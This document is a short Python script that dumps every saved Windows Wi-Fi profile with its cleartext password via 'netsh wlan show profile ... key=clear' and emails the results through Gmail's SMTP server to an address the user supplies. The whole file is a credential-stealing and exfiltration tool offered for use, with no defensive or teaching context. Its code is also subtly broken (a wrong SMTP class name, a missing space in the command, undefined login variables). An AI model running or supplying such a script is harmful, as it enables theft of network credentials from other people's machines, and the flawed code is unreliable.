import subprocess, smtplib, re

command = "netsh wlan show profile"
networks = subprocess.check_output(command,shell = True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = ""
for network in network_list:
    command = "netsh wlan show profile " + network + "key=clear"
    one_network_result = subprocess.check_output(command,shell = True)
    final_output += one_network_result

#input your details which the wifi password should be sent to
server = smtplib.smtp("smtp.gmail.com", 587)
server.starttls()
server.login(my_email, password)
server.sendmail(my_email, my_email, final_output)
server.quit()